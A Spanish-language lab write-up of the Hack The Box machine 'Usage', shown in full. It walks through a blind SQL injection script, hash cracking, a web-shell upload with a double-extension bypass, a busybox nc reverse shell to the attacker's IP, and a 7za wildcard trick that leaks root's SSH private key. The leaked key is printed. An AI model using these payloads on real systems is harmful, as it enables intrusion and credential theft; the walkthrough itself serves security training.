---
tags:
title: Usage- Easy (HTB)
permalink: /Usage-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.254.83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 03:52 -03
Nmap scan report for 10.129.254.83
Host is up (1.1s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.87 seconds
```

## Website / Port 80

![image-center](/assets/images/{9FCCCDFA-4F67-4252-963C-C74354CD29CB}.png)
## SQL Injection
### Reset password

![image-center](/assets/images/{6CE6405D-48D1-44F3-93EE-2BD8B52DF28A}.png)

Sin embargo si coloco una comilla genera un error. Pero en un rato voy a volver aca

![image-center](/assets/images/{AA7CD34E-767F-407A-9AF4-70CCAD2C7939}.png)
### Error

Ademas si el email no se encuentra en la base de datos tambien muestra un error.

![image-center](/assets/images/{38FE8A4D-BB4C-44FF-9D16-41A49B07B5A2}.png)
### Register 

Si me voy a registrar, puedo hacerlo correctamente.

![image-center](/assets/images/{9715D2FF-8ED2-4D9C-A4C6-69A46F99A8F4}.png)

En el panel de login veo la siguiente interfaz con algunos blogs por lo que parece ser.

![image-center](/assets/images/{B526135C-3040-4A08-9352-C10B2E23168C}.png)
### Feroxbuster enumeration

```bash
feroxbuster -u http://usage.htb -x php -C 503
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.13.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://usage.htb/
 üö©  In-Scope Url          ‚îÇ usage.htb
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üí¢  Status Code Filters   ‚îÇ [503]
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.13.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       32l      137w     6603c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET       12l       22w      334c http://usage.htb/logout => http://usage.htb/login
200      GET      265l      244w     5141c http://usage.htb/login
200      GET      264l      247w     5112c http://usage.htb/registration
405      GET       24l      116w     1009c http://usage.htb/post-login
200      GET      216l      196w     3767c http://usage.htb/forget-password
200      GET      265l      244w     5141c http://usage.htb/
302      GET       12l       22w      334c http://usage.htb/dashboard => http://usage.htb/login
[####################] - 6m     30006/30006   0s      found:7       errors:0      
üö® Caught ctrl+c üö® saving scan state to ferox-http_usage_htb_-1764918358.state ...
[####################] - 6m     30006/30006   0s      found:7       errors:0      
[###########>--------] - 6m     17503/30000   46/s    http://usage.htb/ 
```

El escaneo de `feroxbuster`, no me revelo nada interesante.
## Admin panel

Existe ademas un nuevo Virtual Host que apunta a `admin.usage.htb`.
Pero sin credenciales solo obtengo errores.

![image-center](/assets/images/{DC833BE3-F17A-4177-9A0E-B3ADEBC0787E}.png)
### Back to SQLi

Volviendo a la inyecci√≥n, tratando de usar `sqlmap`. Veo que no la detecta

```bash
sqlmap -r req -p email --batch --dump                   
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.11#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:41:37 /2025-12-05/

[04:41:37] [INFO] parsing HTTP request from 'req'
[04:41:37] [INFO] testing connection to the target URL
[04:41:39] [WARNING] the web server responded with an HTTP error code (419) which could interfere with the results of the tests
[04:41:39] [INFO] checking if the target is protected by some kind of WAF/IPS
<SNIP>
[04:42:52] [WARNING] POST parameter 'email' does not seem to be injectable
[04:42:52] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[04:42:52] [WARNING] HTTP error codes detected during run:
419 (?) - 75 times

[*] ending @ 04:42:52 /2025-12-05/
```
### Script

Por lo que me tuve que crear un script el cual me automatize el proceso. Como veo que cuando una consulta es valida me muestra el siguiente mensaje.

![image-center](/assets/images/{E01AB441-106F-4A12-B474-AB5F8A6289F5}.png)

De lo contrario me muestra una pantalla con el c√≥digo de error `500`. Por lo que jugando con esta respuesta puedo ir iterante por caracteres para saber los datos de la base de datos que corre detr√°s.

```python
#!/usr/bin/env python3
import sys 
import requests
import string
import os
from pwn import *

url =  sys.argv[1]
characters = string.ascii_letters + string.digits + string.punctuation


def sql_injection(url):
    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)
    info = ""
    p2 = log.progress("Output: ")

    for position in range(1, 21):
        for char in characters:
            cookies = {
                "XSRF-TOKEN" : "eyJpdiI6Ik5HcXV2dTgxalFOUUtxcUQvUU5DUHc9PSIsInZhbHVlIjoia0VxMHlNZWhoUllERVlKVWJIcWY2NzIvcklKQVR3bXVjcWNVVEp4TlBIbXNtUUxIY3VWSUZPTFRTYlk1cTNhZUlSVit4T3FVaUdjNE9SSWVvQUhVYmZvTjllSlB6Q3dxUGd1QW5oQ1R2cHlta25Na0FCRDhLcWJFcGJ3OEZ3S1kiLCJtYWMiOiI2N2ExYmFjMjBjNDMyM2ZkZTJmNzM5YWI1ZTQ5N2ZhMTg0ZGVjZDFiMGI3MmQ5ZTZjNmY4YmRjNzQ4ZDBhYjJiIiwidGFnIjoiIn0%3D;",
                "laravel_session": "eyJpdiI6ImhvS2VrbEZ3aTg4OUtqL0k1bVl1akE9PSIsInZhbHVlIjoianZGMlBFQmdaV2N3a09lTVkyWGRucnhuSXFCZTRLRmxIbHEyMXBuUWpodC8yTHdQYVZDanY4YzJ5bk5sYlRGd1F6emhhYTgyYzVRVTFvcXR5Y1h3T2FiQnZQektmUUdxQWJWS1BOazduYUgwSGpNLzByTGoyaituWlhXNDlUdVkiLCJtYWMiOiJmMGE2NTY0MWM3YWJjYzg4OGZmMzBhYmFhMzQzMjUxMGIyMWNkODA5OGFkNDE1M2RmMzExNWY5ZGNiNTAwMWNiIiwidGFnIjoiIn0%3D"
                }
            payload = f"zs1n' or substring(database(),{position},1)='{char}';-- -"
            data = {
                '_token': 'W1PWBBTTMqWXHHpikbvR1BnKhhwffexezFEYXofX',
                "email" : payload
            }
            p1.status(f"Probando posici√≥n {position} con caracter '{char}'")
            response = requests.post(url, data=data, cookies=cookies)
            if "We have e-mailed" in response.text:
                info += char
                p2.status(info)
                break

if __name__ == "__main__":
    sql_injection(url)
```

Es as√≠ como determino el nombre de la base de datos.

```bash
python3 sql.py http://usage.htb/forget-password
[ ] SQLI: Probando posici√≥n 6 con caracter '5'
[\] Output: : usage_blog
```

Ahora puedo jugar con la misma t√©cnica para saber el nombre de las tablas y columnas de la base, usando una query como la siguiente.

```sql
' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),{position},1)='{char}';-- -
```
### Hash

De modo que el resultado son las tablas `admin_users` entre, otras, con las t√≠picas columnas como `id`, `username`, `password`. Por lo que la query la cambie para poder ver los datos de esta columna, y estos son los resultados.

```bash
python3 sql.py http://usage.htb/forget-password
[*] SQLI: Probando posici√≥n 67 con caracter 'h'
[‚ññ] ] tput: : admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```
### Crack password

Por lo que este hash lo meto dentro de un archivo para poder romperlo y asi conseguir la pass.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:07 DONE (2025-12-05 23:31) 0.1390g/s 225.3p/s 225.3c/s 225.3C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Estas son las credenciales del usuario `admin` en la web que corre en la url `admin.usage.htb`.

![image-center](/assets/images/{0A8686AC-9336-449B-8EC6-24E25AE2AAAA}.png)
## CVE 
Como se que corre `laravel-php` en la pagina, encontr√© este [PoC](https://flyd.uk/post/cve-2023-24249/) asociado a la versi√≥n que corre para la misma.

![image-center](/assets/images/{53FE7BD8-9388-4CB8-9FF4-4ECBD3C30B66}.png)
## Shell as dash

Como veo en el mismo post, indica que el filtro aplica para archivos con extensi√≥n `php`.

![image-center](/assets/images/{6720C36B-0DC8-4D93-A439-2E5F1CAC1D50}.png)
### Bypass

Pero usando la doble extensi√≥n, veo que si, el archivo se sube.

![image-center](/assets/images/{23B39D80-46B3-4C60-BDCE-D3A23F18DA4F}.png)

Probando ejecuci√≥n de comandos, veo que el usuario que corre por detr√°s es `dash`.

```bash
curl -s -X GET 'http://admin.usage.htb/uploads/images/cmd.jpg.php?cmd=whoami'
dash
```

Por lo que me envi√© una shell a mi maquina con el siguiente comando:

```bash
curl -s -X GET 'http://admin.usage.htb/uploads/images/cmd.jpg.php?cmd=busybox%20nc%2010.10.17.19%204444%20-e%20%2Fbin%2Fbash'
```

Y desde mi listener `nc` recibo la conexion.

```bash
sudo nc -nlvp 4444
[sudo] password for zsln: 
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.254.83] 50938
whoami
dash
```

```bash
dash@usage:~$ cat user.txt 
cc438d165b041ab972bf7f08fe0adcc7
```
## Shell as xander.

Dentro de un archivo, veo unas credenciales.

```bash
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
## Shell as root

Probando con el usuario `xander` que el otro usuario de la maquina, veo que son validas para `ssh`.

```bash
ssh xander@usage.htb      
xander@usage.htb's password: 
<SNIP>
xander@usage:~$
```
### sudo binary

Viendo los archivos los cuales tiene `xander` la posibilidad de ejecutarlos como `root` encontr√© el siguiente.

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
xander@usage:~$ ls -la /usr/bin/usage_management
-rwxr-xr-x 1 root root 16312 Oct 28  2023 /usr/bin/usage_management
```

El mismo al ejecutarlo, me ofrece 3 opciones:

```bash
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):
```

Adem√°s viendo el contenido del mismo con `strings`, veo que lo que usa para hacer el backup es `7za`
```bash
xander@usage:~$ strings /usr/bin/usage_management

/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
Invalid choice.

```

Una forma de abusar de esto, es generando un archivo que lleve delante un `@` que en si, `7za` no lo comprime sino que lee el contenido del mismo para luego comprimir cada archivo que contenga dentro de el, ya que como en el mismo comando se ve, usa `--` la cual significa que cualquier archivo empezado con `@` o con `-` lo guarda como un archivo vac√≠o y es ac√° cuando entra en juego el par√°metro `-snl` que hace que el binario no guarde el contenido de la clave privada en el zip, ya que voy a crear un link simb√≥lico de la `id_rsa` de `root` con un archivo cualquiera, haciendo que el contenido de la misma se muestre en pantalla.

```bash
ln -s /root/.ssh/id_rsa root_key
touch @root_key
```

Ahora ejecuto el binario y selecciono la opci√≥n `3`, y veo el contenido de la clave `rsa`.

```bash
sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7313 16-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54829859

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17947 files, 113879588 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20931

                                                                               
Files read from disk: 17947
Archive size: 54830004 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7

```

El contenido de la misma lo guardo en un archivo.

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

Y puedo usar la misma como clave de identidad para convertirme en `root`.
```bash 
ssh root@usage.htb -i id_Rsa 
<SNIP>>
root@usage:~# whoami 
root
root@usage:~# cat root.txt 
214602eac80e38d4ebd0acab282381e0
```

`~Happy Hacking.`